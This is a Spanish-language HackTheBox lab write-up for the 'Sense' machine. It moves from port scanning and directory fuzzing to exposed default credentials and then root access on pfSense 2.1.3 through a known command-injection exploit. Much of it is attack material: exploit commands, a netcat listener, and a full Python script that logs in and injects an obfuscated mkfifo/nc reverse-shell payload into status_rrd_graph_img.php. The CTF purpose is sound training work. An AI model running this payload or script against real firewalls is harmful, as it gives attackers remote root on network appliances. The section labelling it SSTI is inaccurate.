---
layout: post
title: HTB_Sense
date: 2023/07/10
slug: HTB_Sense
heroImage: /assets/machines.jpg
---

# Sense {-}

## Introduccion {-}

La maquina del dia se llama Sense.

El replay del live se puede ver aqui

[![S4vitaar Doctor maquina](https://img.youtube.com/vi/WeaLhmbatT0/0.jpg)](https://www.youtube.com/watch?v=WeaLhmbatT0)

Esta maquina hace parte de una sesion intensa y se puede ver a partir de 3:39:30.

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.60
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.60
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.60 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,443 10.10.10.60 -oN targeted
```


| Puerto | Servicio      | Que se nos occure? | Que falta?           |
| ------ | ------------- | ------------------ | -------------------- |
| 80     | http          | Web, Fuzzing       |                      |
| 443    | https         | Web, Fuzzing       |                      |



### Analyzando la web {-}


#### Checkear la web {-}

Si entramos en la url 
```bash
 https://10.10.10.60 
```
, vemos un panel de authentificacion de pfsense.
Teniendo esto en cuenta, miramos por internet si existen credenciales por defecto para este servicio.

Encontramos admin:pfsense pero no funcciona. Vamos a fuzzear la web

#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,txt-php-html http://10.10.10.60/FUZZ.FUZ2Z
```

Aqui vemos routas como:

- stats.php
- help.php
- edit.php
- system.php
- exec.php
- system-users.txt

Los recursos php nos hace un redirect a la pagina de login y la routa system-users.txt hay un mensaje para crear el usuario rohit con el 
password por defecto de la compania. probamos

```bash
rohit:pfsense
```

Hemos podido entrar. Vemos la version del servicio pfsense que es la 2.1.3.
## Vulnerability Assessment {-}

### pfSense {-}


```bash
searchsploit pfsense 2.1.3
```

Vemos un exploit de typo Command Injection.

```bash
searchsploit -m 43560
mv 43560.py pfsense_exploit_rce.py
python3 pfsense_exploit_rce.py -h
```





## Vuln exploit & Gaining Access {-}

### Ganando accesso con SSTI {-}

En el panel de ayuda vemos que nos pide nuestra ip y un puerto.

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Lanzamos el script

    ```bash
    python pfsense_exploit_rce.py --rhost 10.10.10.60 --lhost 10.10.14.7 --lport 443 --username rohit --password pfsense
    ```

```bash
whoami
#Output
root
```

Oh my gaaaaadddddddd!!!!!!!!!

La idea aqui es crearnos nuestro proprio script en python

### Nuestro exploit {-}

```python
#!/usr/bin/python3

from pwn import *

import pdb
import urllib3
import html

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "https://10.10.10.60/index.php"
rce_url = "https://10.10.10.60/status_rrd_graph_img.php?database=queues;"
burpsuite = {'http': 'http://127.0.0.1:8080'}
lport = 443

def makeRequest():

    s = requests.session()
    urllib3.disable_warnings()
    s.verify = False
    r = s.get(main_url)

    csrfMagic = re.findall(r'__csrf_magic\' value="(.*?)"', r.text)[0]

    data_post = {
        '__csrf_magic': csrfMagic,
        'usernamefld': 'rohit',
        'passwordfld': 'pfsense',
        'login': 'Login'
    }

    r = s.post(main_url, data=data_post)

    p1.success("Authenticacion realizada exitosamente como el usuario rohit")

    p2 = log.progress("RCE")
    p2.status("Ejecutando comando a nivel de sistema")

    r = s.get(rce_url + '''ampersand=$(printf+\"\\46\");guion=$(printf+\"\\55\");rm+${HOME}tmp${HOME}f;mkfifo+${HOME}tmp${HOME}f;
    cat+${HOME}tmp${HOME}f|${HOME}bin${HOME}sh+${guion}i+2>${ampersand}1|nc+10.10.14.7+443+>${HOME}tmp${HOME}f''')
    
if __name__ == '__main__':

    p1 = log.progress("Authenticacion")
    p2 = log.progress("RCE")
    p1.status("Iniciando proceso de autenticacion")
    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    if shell.sock is None:
        p2.failure("No se ha obtenido ninguna conexion")
    else:
        p2.success("Se ha obtenido una conexion")
        shell.interactive()
```